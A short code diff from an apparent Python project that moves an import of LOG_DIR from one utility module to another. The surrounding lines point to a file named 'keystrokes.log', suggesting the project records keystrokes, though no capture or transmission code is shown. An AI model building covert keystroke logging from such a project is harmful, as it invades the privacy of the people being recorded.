@@ -3,7 +3,7 @@ from os.path import join as join_path
 from classes.converter import convert
 from client.configurate import Config
 from utils.validation import Log
-from utils.config import LOG_DIR
+from utils.settings import LOG_DIR
 from utils.helpers import get_filepath
 
 ENCODED_FILEPATH = join_path(LOG_DIR, "keystrokes.log")
